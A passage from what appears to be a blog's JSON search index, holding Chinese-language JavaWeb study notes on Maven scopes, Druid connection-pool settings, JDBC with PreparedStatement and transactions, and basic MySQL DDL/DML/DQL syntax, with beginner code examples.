：作用于编译环境、测试环境、运行环境。\ntest ： 作用于测试环境。典型的就是 Junit 坐标，以后使用 Junit 时，都会将 scope 指定为该值\nprovided ：作用于编译环境、测试环境。我们后面会学习  servlet-api  ，在使用它时，必须将  scope  设置为该值，不然运行时就会报错\nruntime  ： 作用于测试环境、运行环境。jdbc 驱动一般将  scope  设置为该值，当然不设置也没有任何问题\n\n\n\n\n\n\n\n\n\n\n注意：\n\n如果引入坐标不指定  scope  标签时，默认就是 compile  值。以后大部分 jar 包都是使用默认值。\n\n","slug":"JavaWeb-Maven","date":"2022-06-23T13:37:21.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"647a0ca593f8753976e4c6270337edb2","title":"druid配置详解","content":"# druid 配置详解\n\n\n\n属性\n说明\n建议值\n\n\n\n\nurl\n数据库的 jdbc 连接地址。一般为连接 oracle/mysql。示例如下：\n\n\n\n\nmysql : jdbc:mysql://ip:port/dbname?option1&amp;option2&amp;…\n\n\n\n\noracle : jdbc:oracle:thin:@ip:port:oracle_sid\n\n\n\n\n\n\n\n\nusername\n登录数据库的用户名\n\n\n\npassword\n登录数据库的用户密码\n\n\n\ninitialSize\n启动程序时，在连接池中初始化多少个连接\n10-50 已足够\n\n\nmaxActive\n连接池中最多支持多少个活动会话\n\n\n\nmaxWait\n程序向连接池中请求连接时，超过 maxWait 的值后，认为本次请求失败，即连接池\n100\n\n\n\n没有可用连接，单位毫秒，设置 - 1 时表示无限等待\n\n\n\nminEvictableIdleTimeMillis\n池中某个连接的空闲时长达到 N 毫秒后，连接池在下次检查空闲连接时，将\n见说明部分\n\n\n\n回收该连接，要小于防火墙超时设置\n\n\n\n\nnet.netfilter.nf_conntrack_tcp_timeout_established 的设置\n\n\n\ntimeBetweenEvictionRunsMillis\n检查空闲连接的频率，单位毫秒，非正整数时表示不进行检查\n\n\n\nkeepAlive\n程序没有 close 连接且空闲时长超过 minEvictableIdleTimeMillis, 则会执\ntrue\n\n\n\n行 validationQuery 指定的 SQL, 以保证该程序连接不会池 kill 掉，其范围不超\n\n\n\n\n过 minIdle 指定的连接个数。\n\n\n\nminIdle\n回收空闲连接时，将保证至少有 minIdle 个连接.\n与 initialSize 相同\n\n\nremoveAbandoned\n要求程序从池中 get 到连接后，N 秒后必须 close, 否则 druid 会强制回收该\nfalse, 当发现程序有未\n\n\n\n连接，不管该连接中是活动还是空闲，以防止进程不会进行 close 而霸占连接。\n正常 close 连接时设置为 true\n\n\nremoveAbandonedTimeout\n设置 druid 强制回收连接的时限，当程序从池中 get 到连接开始算起，超过此\n应大于业务运行最长时间\n\n\n\n值后，druid 将强制回收该连接，单位秒。\n\n\n\nlogAbandoned\n当 druid 强制回收连接后，是否将 stack trace 记录到日志中\ntrue\n\n\ntestWhileIdle\n当程序请求连接，池在分配连接时，是否先检查该连接是否有效。(高效)\ntrue\n\n\nvalidationQuery\n检查池中的连接是否仍可用的 SQL 语句，drui 会连接到数据库执行该 SQL, 如果\n\n\n\n\n正常返回，则表示连接可用，否则表示连接不可用\n\n\n\ntestOnBorrow\n程序 申请 连接时，进行连接有效性检查（低效，影响性能）\nfalse\n\n\ntestOnReturn\n程序 返还 连接时，进行连接有效性检查（低效，影响性能）\nfalse\n\n\npoolPreparedStatements\n缓存通过以下两个方法发起的 SQL:\ntrue\n\n\n\npublic PreparedStatement prepareStatement(String sql)\n\n\n\n\npublic PreparedStatement prepareStatement(String sql,\n\n\n\n\nint resultSetType, int resultSetConcurrency)\n\n\n\nmaxPoolPrepareStatementPerConnectionSize\n每个连接最多缓存多少个 SQL\n20\n\n\nfilters\n这里配置的是插件，常用的插件有:\nstat,wall,slf4j\n\n\n\n监控统计: filter:stat\n\n\n\n\n日志监控: filter:log4j 或者 slf4j\n\n\n\n\n防御 SQL 注入: filter:wall\n\n\n\nconnectProperties\n连接属性。比如设置一些连接池统计方面的配置。\n\n\n\n\ndruid.stat.mergeSql=true;druid.stat.slowSqlMillis=5000\n\n\n\n\n比如设置一些数据库连接属性:\n\n\n\n\n\n\n\n\n\n# 配置示例\ndriverClassName&#x3D;com.mysql.jdbc.Driver\nurl&#x3D;jdbc:mysql:&#x2F;&#x2F;&#x2F;db3?useSSL&#x3D;false&amp;useServerPrepStmts&#x3D;true\nusername&#x3D;root\npassword&#x3D;root\n#初始化连接数量\ninitialSize&#x3D;5\n#最大连接数\nmaxActive&#x3D;10\n#最大等待时间\nmaxWait&#x3D;3000\n","slug":"druid配置详解","date":"2022-06-22T12:57:50.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"4892e4a27a2575ab7f5b307cf40eb42d","title":"JavaWeb-JDBC","content":"# 1、JDBC 简介\n\n\nJDBC 概念\n\nJDBC 就是使用 Java 语言操作关系型数据库的一套 API\n全称：（Java DataBase Connectivity）Java 数据库连接\n\n\n\nJDBC 本质：\n\n官方（Sun 公司）定义的一套操作所有关系型数据库的规则，即接口\n各个数据库厂商去实现这套接口，提供数据库驱动 jar 包\n我们可以使用这套接口（JDBC）编程，真正执行的代码是驱动 jar 包中的实现类\n\n\n\nJDBC 好处：\n\n各数据库厂商使用相同的接口，Java 代码不需要针推不同数据库分别开发\n可随时替换底层数据库，访问数据库的 Java 代码基本不变\n\n\n\n# 2、JDBC 快速入门\n# 2.1 步骤\n\n\n创建工程，导入驱动 jar 包\n\n\n注册驱动\n\n\n获取连接\n\n\n定义 SQL 语句\n\n\n获取执行 SQL 对象\n\n\n执行 SQL\n\n\n处理返回结果\n\n\n释放资源\n\n\npackage com.itheima.jdbc;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.Statement;\n\n/**\n * 快速入门\n */\npublic class JDBCDemo &#123;\n    public static void main(String[] args) throws Exception &#123;\n        //1. 注册驱动\n        Class.forName(\"com.mysql.jdbc.Driver\");\n\n        //2. 获取连接\n        String url = \"jdbc:mysql://127.0.0.1:3306/db3\";\n        String username = \"root\";\n        String password = \"root\";\n        Connection conn = DriverManager.getConnection(url, username, password);\n\n        //3. 定义SQL语句\n        String sql = \"UPDATE ACCOUNT SET MONEY = 2000 WHERE ID = 1\";\n\n        //4. 获取执行SQL的对象 statement\n        Statement stmt = conn.createStatement();\n        \n\n        //5. 执行sql\n        int count = stmt.executeUpdate(sql);\n        //返回受影响的行数\n\n        //6. 处理结果\n        System.out.println(count);\n\n        //7. 释放资源\n        stmt.close();\n        conn.close();\n    &#125;\n&#125;\n\n# 3、JDBC API 详解\n\nDriverManager\nConnection\nStatement\nResultSet\nPreparedStatement\n\n# 3.1 DriverManager\n\nDriverManager（驱动管理类）作用：\n\n注册驱动\n获取数据库连接\n\n\nDriverManager 是一个工具类，里面都是静态方法\n\n\n\n\n描述\n方法名\n\n\n\n\nstatic Connection\ngetConnection(Stirng url, String user, String password)\n\n\n\n参数：\n\nURL：连接路径\n\n\n\n\n\n\n\n\n\n\n语法：jdbc:mysq://ip 地址 (域名): 端口号 / 数据库名称？参数键值对 1 &amp; 参数键值对 2\n示例：jdbc:mysql://127.0.0.1:3306/db1\n细节：\n\n如果连接的是本机 mysql 服务器，并且 mysql 服务默认端口号是 3306，则 url 可以简写为 jdbc:mysql/// 数据库名称？参数键值对\n配置 useSSL=false 参数，禁用安全连接方式，解决警告提示:jdbc:mysql///db2?useSSL=false\n\n\nuser：用户名\npassword：密码\n\n# 3.2 Connection\n\n\nConnection (数据库连接对象) 作用：\n\n\n获取执行 SQL 的对象\n\n普通执行 SQL 对象 Statement create Statement()\n预编译 SQL 的执行 SQL 对象：防止 SQL 注入： PreparedStatement preparedStatement(sql)\n执行存储过程的对象： CallableStatement prepareCall(sql)\n\n\n\n管理事务\n\n\nMySQL 事务管理\n\n\n\n\n\n\n\n\n\n开启事务：BEGIN;/START TRANSACTION;\n提交事务：COMMIT;\n回滚事务：ROLLBACK;\nMYSQL 默认自动提交事务\n\n\nJDBC 事务管理：Connection 接口中定义了 3 个对应方法\n\n\n\n\n\n\n\n\n\n开启事务：setAutoCommit (boolean autoCommit)：true 为自动提交事务，false 为手动提交事务\n提交事务：commit ()\n回滚事务：rollback ()\ntry &#123;\n    //开启事务\n    conn.setAutoCommit(false);\n    //执行sql1，并处理结果\n    int count1 = stmt.executeUpdate(sql1);\n    System.out.println(count1);\n       \n    //执行sql2，并处理结果\n    int count2 = stmt.executeUpdate(sql2);\n    System.out.println(count2);\n&#125; catch (Exception e) &#123;\n    //回滚事务\n    conn.rollback();\n    throw new RuntimeException(e);\n&#125;\n//提交事务\nconn.commit();\n\n\n\n\n\n\n# 3.3 Statement\n\nStatement 作用：\n\n执行 SQL 语句\n\n\n执行 SQL 语句：\n\n\n\n\n\n\n\n\n\n\nint executeUpdate (sql) 执行 DML，DDL 语句\n\n返回值：(1) DML 语句影响的行数\t(2) DDL 语句执行后，执行成功也可能返回 0（DDL 不报异常一般就是成功）\nResultSet executeQuery (sql) 执行 DQL 语句\n\n\n\n\n\n\n\n\n\n返回值：ResultSet 结果集对象\n\n# 3.4 ResultSet\n\n\nResultSet (结果集对象) 作用：\n\n\n封装了 DQL 查询语句的结果\n\n\n\n\n\n\n\n\n\nResultSet stmt.executeQuery (sql): 执行 SQL 语句，返回 ResultSet 对象\n\n\n\n\n获取查询结果\n\n\n\n\n\n\n\n\n\n\n\nboolean next ():(1) 将光标从当前位置移动向下一行\t(2) 判断当前行是否为有效行\n\n返回值：\n\ntrue：有效行，当前行有数据\nfalse：无效行，当前行没有数据\n\nxxx getXxx (参数)：获取数据\n\n\n\n\n\n\n\n\n\nxxx：参数类型，如 int getint (参数); String getString (参数)\n参数：\n\nint：列的编号，从 1 开始\nString：列的名称\n\n\n\n使用步骤\n\n游标向下移动一行，并判断该行是否有数据：next ()\n获取数据：getXxx (参数)\n\n\n\n//循环判断游标是否为最后一行末尾\nwhile (rs.next())&#123;\n    //获取数据\n    rs.getXxx(参数);\n&#125;\npackage com.itheima.jdbc;\n\nimport org.junit.Test;\n\nimport java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class JDBCDemo5_ResultSet &#123;\n    /**\n     * ResultSet\n     * @throws Exception\n     */\n    @Test\n    public void testResultSet() throws Exception &#123;\n        Class.forName(\"com.mysql.jdbc.Driver\");\n        String url = \"jdbc:mysql://127.0.0.1:3306/db3?useSSL=false\";\n        String username = \"root\";\n        String password = \"root\";\n        Connection conn = DriverManager.getConnection(url, username, password);\n\n        Statement statement = conn.createStatement();\n        String sql = \"SELECT * FROM ACCOUNT\";\n\n        ResultSet resultSet = statement.executeQuery(sql);\n        //处理结果\n        //光标向下移动一行，并且判断当前行是否有数据\n        while (resultSet.next()) &#123;\n            //获取数据\n            int anInt = resultSet.getInt(1);\n            String string = resultSet.getString(2);\n            double anInt1 = resultSet.getDouble(3);\n\n            int id = resultSet.getInt(\"id\");\n            String name = resultSet.getString(\"name\");\n            double money = resultSet.getDouble(\"money\");\n            System.out.println(id + \"---\" + name + \"---\" + money);\n        &#125;\n\n        resultSet.close();\n        statement.close();\n        conn.close();\n    &#125;\n&#125;\n\n\n\n\n\n\n\n\n\n\npojo：用来存放实体类，简单的 java 对象的包\n\n\n\n\n\n\n\n\n\n需求：将数据库中的数据封装为 account 对象，并存储到集合中\n@Test\npublic void testResultSet2() throws Exception &#123;\n    Class.forName(\"com.mysql.jdbc.Driver\");\n    String url = \"jdbc:mysql://127.0.0.1:3306/db3?useSSL=false\";\n    String username = \"root\";\n    String password = \"root\";\n    Connection conn = DriverManager.getConnection(url, username, password);\n\n    Statement statement = conn.createStatement();\n    String sql = \"SELECT * FROM ACCOUNT\";\n\n    ResultSet resultSet = statement.executeQuery(sql);\n\n    //创建一个集合\n    List&lt;Account> list = new ArrayList&lt;>();\n    while (resultSet.next()) &#123;\n        Account account = new Account();\n        //获取数据\n        int id = resultSet.getInt(\"id\");\n        String name = resultSet.getString(\"name\");\n        double money = resultSet.getDouble(\"money\");\n\n        //设置数据\n        account.setId(id);\n        account.setName(name);\n        account.setMoney(money);\n\n        //向列表内添加数据\n        list.add(account);\n    &#125;\n\n    System.out.println(list);\n    resultSet.close();\n    statement.close();\n    conn.close();\n&#125;\n# 3.5 PreparedStatement\n\nPreparedStatement 作用：\n\n预编译 SQL 语句并执行：预防 SQL 注入问题\n\n\nSQL 注入：\n\nSQL 注入是通过操作输入来修改事先定义好的 SQL 语句，用以达到执行代码对服务器进行攻击的方法\n\n\n\n\n获取 PreparedStatement 对象\n\n//SQL语句中的参数值，使用？占位符替代\nString sql = \"select * from user where username = ? and password = ?\";\n//通过Connection对象获取，并传入对应的SQL语句\nPreparedStatement pstmt = conn.preparedStatement(sql);\n\n设置参数值\n\nPreparedStatement对象：setXxx(参数1，参数2)：给？赋值\nXxx：数据类型,如setInt(参数1，参数2)\n参数：\n    参数1：？的位置编号，从1开始\n    参数2：？的值\n\n执行 SQL\n\nexecuteUpdate();/executeQuery(); 不需要再传递SQL\npackage com.itheima.jdbc;\n\nimport org.junit.Test;\n\nimport java.sql.*;\n\npublic class JDBCDemo5_PreparedStatement &#123;\n    /**\n     * PreparedStatement\n     * @throws Exception\n     */\n    @Test\n    public void testPreparedStatement() throws Exception &#123;\n        Class.forName(\"com.mysql.jdbc.Driver\");\n\n        String url = \"jdbc:mysql:///db3?useSSL=false&amp;useServerPrepStmts=true\";\n        String username = \"root\";\n        String password = \"root\";\n        Connection connection = DriverManager.getConnection(url, username, password);\n\n        //设置sql，用？代替参数的位置\n        String sql = \"SELECT * FROM EMP WHERE ID = ?\";\n        //获取PreparedStatement，传递SQL\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //设置参数\n        preparedStatement.setInt(1,2);\n        //执行\n        ResultSet resultSet = preparedStatement.executeQuery();\n        while (resultSet.next()) &#123;\n            int id = resultSet.getInt(\"id\");\n            String name = resultSet.getString(\"name\");\n            String gender = resultSet.getString(\"gende\");\n            double salary = resultSet.getDouble(\"salary\");\n            Date join_date = resultSet.getDate(\"join_date\");\n            int dept_id = resultSet.getInt(\"dept_id\");\n            System.out.println(id);\n            System.out.println(name);\n            System.out.println(gender);\n            System.out.println(salary);\n            System.out.println(join_date);\n            System.out.println(dept_id);\n            System.out.println(\"------------------\");\n        &#125;\n    &#125;\n&#125;\n\n要使用预编译功能，在获取连接的 url 里要使用键值对 useServerPrepStmts=true  手动开启，默认是关闭的\n配置 MySQL 执行日志（my.ini，重启 mysql 服务后生效）\n\n\n\n\n\n\n\n\n\n\nlog-output=FILE\ngeneral-log=1\ngeneral_log_file=“D:\\mysql.log”\nslow-query-log=1\nslow_query_log_file=“D:\\mysql_slow.log”\nlong_query_time=2\n# 4、数据库连接池\n\n数据链接池简介\nDruid 数据库连接池\n\n# 4.1 数据库连接池简介\n\n数据库连接池是个容器，负责分配、管理数据库连接（connection）\n它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个\n释放空闲时间超过最大空闲时间的数据库连接来避免因为没有释放数据库连接而引起的数据库连接遗漏\n好处：\n\n资源重用\n提升系统响应速度\n避免数据库连接遗漏\n\n\n\n# 4.2 数据库连接池实现\n\n标准接口：DataSource\n\n官方（SUN）提供的数据库连接池标准接口，由第三方组织实现此接口\n功能：获取连接\n\n\n\nConnection getConnection();\n\n常见的数据库连接池：\n\nDBCP\nC3P0\nDruid\n\n\nDruid (德鲁伊)：\n\nDruid 连接池是阿里巴巴开源的数据库连接池项目\n功能强大，性能优秀，是 Java 语言最好的数据库连接池之一\n\n\n\n# 4.3 Druid 使用步骤\n\n导入 jar 包\n定义配置文件\n加载配置文件\n获取数据库连接池对象\n获取连接\n\npackage com.itheima.druid;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.util.Properties;\n\n/**\n * Druid数据库连接池演示\n */\npublic class DruidDemo &#123;\n    public static void main(String[] args) throws Exception &#123;\n        //1.导入jar包\n        //2.定义配置文件\n        //3.加载配置文件\n        Properties prop = new Properties();\n        prop.load(new FileInputStream(\"src/druid.properties\"));\n        //4.获取连接池对象\n        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n        //5.获取对应数据库连接\n        Connection connection = dataSource.getConnection();\n        System.out.println(connection);\n        //获取当前工作路径，用来判断导入文件时的路径\n        System.out.println(System.getProperty(\"user.dir\"));\n    &#125;\n&#125;\n# 练习\n完成商品品牌数据的增删改查操作\n\n\n查询：查询所有数据\n\n\n添加：添加品牌\n\n\n修改：根据 id 修改\n\n\n删除：根据 id 删除\n\n\n准备环境：\n\n数据库表：tb_\tbrand\n实体类 Brand\n测试用例\n\n\n\n# 1、查询所有数据\n\n获取 Connection\n定义 SQL：select * from tb_brand;\n获取 PreparedStetement 对象\n设置参数：不需要\n执行 SQL\n处理结果：List&lt;Brand&gt;\n释放资源\n\npackage example;\n\nimport com.alibaba.druid.pool.DruidDataSourceFactory;\nimport com.itheima.pojo.Brand;\nimport org.junit.Test;\n\nimport javax.sql.DataSource;\nimport java.io.FileInputStream;\nimport java.sql.Connection;\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Properties;\n\npublic class BrandTest &#123;\n    /**\n     * 查询所有\n     * 核心思想：\n     * 1.select * from tb_brand;\n     * 2.参数：不需要\n     * 3.结果：Lsit&lt;Brand>\n     */\n    @Test\n    public void testSelectAll() throws Exception &#123;\n        //1.获取Connection\n        Properties prop = new Properties();\n        prop.load(new FileInputStream(\"src/druid.properties\"));\n        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n        Connection connection = dataSource.getConnection();\n        System.out.println(connection);\n        //2.定义SQL语句\n        String sql = \"select * from tb_brand;\";\n        //3.获取PreparedStatement对象\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //4.设置参数——无参数\n        //5.执行SQL\n        ResultSet resultSet = preparedStatement.executeQuery();\n        //6.处理结果\n        List&lt;Brand> brands = new ArrayList&lt;>();\n        Brand brand = null;\n        while (resultSet.next()) &#123;\n            Integer id = resultSet.getInt(\"id\");\n            String brandName = resultSet.getString(\"brand_name\");\n            String companyName = resultSet.getString(\"company_name\");\n            Integer ordered = resultSet.getInt(\"ordered\");\n            String description = resultSet.getString(\"description\");\n            Integer status = resultSet.getInt(\"status\");\n            brand = new Brand();\n            brand.setId(id);\n            brand.setBrandName(brandName);\n            brand.setCompanyName(companyName);\n            brand.setOrdered(ordered);\n            brand.setDescription(description);\n            brand.setStatus(status);\n            brands.add(brand);\n        &#125;\n        //7.释放资源\n        resultSet.close();\n        preparedStatement.close();\n        connection.close();\n\n        System.out.println(brands);\n    &#125;\n&#125;\n# 2、添加数据\n\n编写 SQL 语句\n是否需要参数？需要，除了 ID 之外的所有参数\n返回结果如何封装？boolean\n\n@Test\n    public void testAdd() throws Exception &#123;\n        //接收页面提交的参数\n        String brandName = \"香飘飘\";\n        String companyName = \"香飘飘\";\n        int ordered = 1;\n        String description = \"绕地球一圈\";\n        int status = 1;\n\n        //1.获取Connection\n        Properties prop = new Properties();\n        prop.load(new FileInputStream(\"src/druid.properties\"));\n        DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n        Connection connection = dataSource.getConnection();\n        System.out.println(connection);\n        //2.定义SQL语句\n        String sql = \"insert into tb_brand(brand_name,company_name,ordered,description,status) values(?,?,?,?,?)\";\n        //3.获取PreparedStatement对象\n        PreparedStatement preparedStatement = connection.prepareStatement(sql);\n        //4.设置参数\n        preparedStatement.setString(1,brandName);\n        preparedStatement.setString(2,companyName);\n        preparedStatement.setInt(3,ordered);\n        preparedStatement.setString(4,description);\n        preparedStatement.setInt(5,status);\n        //5.执行SQL\n        int count = preparedStatement.executeUpdate();\n        //6.处理结果\n        System.out.println(count > 0);\n        //7.释放资源\n        preparedStatement.close();\n        connection.close();\n    &#125;\n# 3、根据 ID 修改\n\n编写 sql 语句\n是否需要参数？需要：Brand 对象所有数据\n返回结果如何封装？boolean\n\n@Test\npublic void testUpdate() throws Exception &#123;\n    //接收页面提交的参数\n    String brandName = \"香飘飘\";\n    String companyName = \"香飘飘\";\n    int ordered = 1000;\n    String description = \"绕地球三圈\";\n    int status = 1;\n    int id = 4;\n\n    //1.获取Connection\n    Properties prop = new Properties();\n    prop.load(new FileInputStream(\"src/druid.properties\"));\n    DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n    Connection connection = dataSource.getConnection();\n    System.out.println(connection);\n    //2.定义SQL语句\n    String sql = \"update tb_brand set brand_name=?,company_name=?,ordered=?,description=?,status=? where id=?;\";\n    //3.获取PreparedStatement对象\n    PreparedStatement preparedStatement = connection.prepareStatement(sql);\n    //4.设置参数\n    preparedStatement.setString(1,brandName);\n    preparedStatement.setString(2,companyName);\n    preparedStatement.setInt(3,ordered);\n    preparedStatement.setString(4,description);\n    preparedStatement.setInt(5,status);\n    preparedStatement.setInt(6,id);\n    //5.执行SQL\n    int count = preparedStatement.executeUpdate();\n    //6.处理结果\n    System.out.println(count > 0);\n    //7.释放资源\n    preparedStatement.close();\n    connection.close();\n&#125;\n# 4、根据 ID 修改\n\n编写 SQL 语句\n是否需要参数？需要，id\n返回结果如何处理？boolean\n\n@Test\npublic void testDelete() throws Exception &#123;\n    Properties prop = new Properties();\n    prop.load(new FileInputStream(\"src/druid.properties\"));\n    DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\n    Connection connection = dataSource.getConnection();\n\n    String sql = \"delete from tb_brand where id=?;\";\n\n    PreparedStatement preparedStatement = connection.prepareStatement(sql);\n    preparedStatement.setInt(1,4);\n    int i = preparedStatement.executeUpdate();\n    System.out.println(i > 0);\n    preparedStatement.close();\n    connection.close();\n&#125;\n","slug":"JavaWeb-JDBC","date":"2022-06-22T12:55:59.000Z","categories_index":"JavaWeb","tags_index":"JavaWeb","author_index":"cCor4ng3"},{"id":"bd2363725236602d9ed430e1445ce7eb","title":"JavaWeb-数据库","content":"JavaWeb - 数据库\n# 1、数据库的相关概念\n\n数据库\n数据库管理系统\nSQL\n常见的关系型数据库管理系统\n\n数据库：\n\n存储数据的仓库，数据是有组织进行存储\n英文：DataBase，简称 DB\n\n数据库管理系统：\n\n管理数据库的大型软件\n英文：DataBase Management System，简称 DBMS\n\nSQL：\n\n英文：Structured Query Language，简称 SQL，结构化查询语言\n操作关系型数据库的语言\n定义操作所有关系型数据库的统一标准\n每一种数据库的操作方式存在不一样的地方，称为 “方言”\n\n常见的关系型数据库管理系统：\n\nOracle：收费，且非常昂贵，金融银行使用 Oracle 的居多\nMySQL：开源的免费的中小型数据库，在互联网公司使用的非常多\nSQL Server：微软的收费数据库，在 Java 中使用的不多\nPostgreSQL：开源中小型数据库\nDB2：IBM 公司的大型收费数据库产品\nSQLite：嵌入式的微型数据库，如：作为 Android 内置数据库\nMariaDB：开源免费中小型数据库\n\n\n\n\n\n\n\n\n\n\n本次只学习 MySQL，对于后续的其他数据库，都是使用 SQL 操作的，而且 SQL 可以操作市面上所有的关系型数据库\n# 2、MySQL 数据库\n\nMySQL 安装\nMySQL 卸载\nMySQL 配置\nMySQL 登录、退出\n\n安装、登录、卸载、配置等参见安装手册\n\nMySQL 数据模型\n\nMySQL 数据库模型：\n\n关系型数据库\n\n关系型数据库是建立在关系模型基础上的数据库，简单说，关系型数据库是由多张能够相互连接的二维表组成的数据库\n优点：\n\n都是使用表结构，格式一致，易于维护\n使用通用的 SQL 语言操作，使用方便，可用于复杂查询\n数据存储在磁盘中，安全（存在硬盘中就是持久化存储）\n\n\n\n\n不通过表存取的就是非关系型数据库\n数据库是通过文件夹实现的，MySQL 的数据存放在 data 目录下，每个文件夹对应一个数据库\n\n# 3、SQL 通用语法\n\nSQL 语句可以以单行或多行书写，以分号结尾\n可以使用空格或制表符来提高可读性\nMySQL 数据库的 SQL 语句不区分大小写，但是关键字建议以大写来表示\n3 种注释：\n\n单行注释：– 注释内容  或 #注释内容\n多行注释：/* 注释内容 */\n\n\n\n# 4、SQL 分类\nSQL 语句根据其功能，主要分为四类：DDL、DML、DQL、DCL。 DDL：\nDDL：Data Definition Language 数据定义语言，用来定义数据库对象 (数据库，表， 字段)\nDML：Data Manipulation Language 数据操作语言，用来对数据库表中的数据进行增删改\nDQL： Data Query Language 数据查询语言，用来查询数据库中表的记录\nDCL： Data Control Language 数据控制语言，用来创建数据库用户、控制数据库的访问权限\n\n# 5、DDL：操作数据库、表\n# 5.1 操作数据库：CRUD\n\n\nC (Create)：创建\n\n\n创建数据库：create database 数据库名称；\n\n\n创建数据库，判断是否存在，不存在再创建：create database if not exists 数据库名称；\n\n\n创建数据库，并指定字符集：create database 数据库名称 character set 字符集名；\n\n\n创建一个 db4 的数据库，判断是否存在，并指定字符集为 gbk：create database if not exists db4 character set gbk;\n\n\n\n\nR (Retrieve)：查询\n\n查询所有数据库的名称：show databases;\n查询创建数据库的 SQL 语句、字符集：show create database 数据库名；\n\n\n\nU (Update)：修改\n\n修改数据库的字符集：alter database 数据库名称 character set 字符集名；\n\n\n\nD (Delete)：删除\n\n删除数据库：drop database 数据库名称；\n判断数据库是否存在，存在再删除：drop database if exists 数据库名称；\n\n\n\n使用数据库\n\n查询当前正在使用的数据库名称：select database();\n使用数据库：use 数据库名称；\n\n\n\n# 5.2 操作表：CRUD\n\n\nC (Create)：创建\n\n\n语法：create table 表名 (\n列明 1 数据类型 1,\n列名 2 数据类型 2,\n…\n列明 n 数据类型 n\n);# 注意最后一列不需要加逗号\n\n\n数据类型\n\nint：整数类型\n\nage int,\n\n\ndouble：小数类型\n\nscore double (5,2)_最多有 5 位，小数点后 2 位\n\n\ndate：日期，只包含年月日，yyyy-MM-dd\ndatetime：日期，包含年月日时分秒，yyyy-MM-dd HH:mm:ss\ntimestamp：时间戳类型，包含年月日时分秒，如果将来不给这个字段赋值或赋值为 null，则默认使用当前的系统时间来自动赋值\nvarchar：字符串\n\nname varchar (20)：姓名最大 20 个字符\n\n\n\n\n\n复制一张表，如复制一张 student 为 student1：create table student1 like student;\n\n\n创建一张学生表\n\n\nmysql> create table student(\n    -> id int,\n    -> name varchar(32),\n    -> age int,\n    -> score double(4,1),\n    -> birthday date,\n    -> insert_time timestamp\n    -> );\n\n\nR (Retrieve)：查询\n\n查询某个数据库中所有表的名称：show tables;\n查询表结构：desc 表名称；\n查询表的创建语句：show create table 表名；\n\n\n\nU (Update)：修改\n\n修改表名：alter table 表名 rename to 新表名；\n修改表的字符集：show create table 表名；alter table 表名 character set 新字符集名；\n添加一列：alter table 表名 add 列名 数据类型；\n修改列名称、类型：alter table 表名 change 旧列名 新列明 新数据类型； 或 alter table 表名 modify 列名 新数据类型；\n删除列：alter table 表名 drop 列名；\n\n\n\nD (Delete)：删除\n\n删除表：drop table 表名；\n如果存在，再删除：drop table if exists 表名；\n\n\n\n\n# 6、DML：增删改表中数据\n# 5.1 添加数据\n\n基本语法：insert into 表名 (列名 1, 列明 2,…, 列明 n) values (值 1, 值 2, 值 3,…, 值 n)\n注意：\n\n列明和值要一一对应\n如果表名后不定义列明，则默认给所有列添加值\n除了数字类型，其他类型需要使用引号 (单双引号都可以) 引起来\n\n\n\n# 5.2 删除数据\n\n基本语法：delete from 表名 [where 条件];\n\n删除 id 为 2 的值：delete from stu where id = 2;\n\n\n注意：\n\n如果不加条件，则删除表中所有记录，非常危险不要使用\n如果要删除所有记录，两种方法：\n\ndelete from 表名；-- 不推荐使用，因为有多少条记录就执行多少次指令，效率很低\n**truncate table 表名；** 先删除表，再创建一个和原表一样的空表，推荐使用，效率更高\n\n\n\n\n\n# 5.3 修改数据\n\n基本语法：update 表名 set 列名 1 = 值 1, 列明 2 = 值 2,…, 列明 n = 值 n [where 条件];\n\n将 stu 表内的 id 为 3 的 age 改为 117： UPDATE stu SET age = 117 WHERE id = 3;\n更改多条数据： UPDATE stu SET age = 18, score = 100 WHERE id = 2;\n\n\n注意：\n\n如果不加任何条件，则会将表中所有记录全部修改\n\n\n\n# 7、DQL：查询表中的记录\n\nselect * from 表名；\n\n# 7.1 语法\n\n\n\n\n\n\n\n\n\nselect\n​\t字段列表\nfrom\n​\t表名列表\nwhere\n​\t条件列表\ngroup by\n​\t分组字段\nhaving\n​\t分组之后的条件\norder by\n​\t排序\nlimit\n​\t分页限定\n# 7.2 基础查询\n\n查询多个字段：select 字段名 1, 字段名 2,… 字段名 n from 表名；\n\n注意：如果查询所有字段，则可以使用 * 来替代字段列表\n\n\n\n-- 查询姓名 和 年龄\nSELECT NAME,age FROM student;\nSELECT * FROM student;\n\n去除重复：select distinct 列名 1, 列明 2,… from 表名；\n\n-- 去除重复的结果集\nSELECT DISTINCT address FROM student;\nSELECT DISTINCT NAME,address FROM student;\n#当查询多个字段时，只有两个字段组合的值相同了之后才会去重\n\n计算列：一般可以使用四则运算来计算列的值，一般只会进行数值型的运算\n\nifnull (表达式 1, 表达式 2)：null 参与的运算，计算结果都是 null\n\n表达式 1：哪个字段需要判断是否为 Null\n表达式 2：该字段为 null 则替换后的值\n\n\n\n\n\n-- 计算math 和 English 分数之和\nSELECT NAME,math,english FROM student;\nSELECT NAME,math,english,math+english FROM student;\n-- 如果有null参与的运算,计算结果都为null\nSELECT NAME,math,english,math+IFNULL(english,0) FROM student;\n-- ifnull(a,b)：如果a为null，替换为b\n\n起别名：列名 as 重命名  或  列明 + 空格 + 重命名\n\nas 可以省略，用一个或多个空格代替\n\n\n\n-- 起别名\nSELECT NAME,math,english,math+IFNULL(english,0) AS '总分' FROM student;\nSELECT NAME,math 数学,english 英语,math+IFNULL(english,0) '总分' FROM student;\n# 7.3 条件查询\n\nwhere 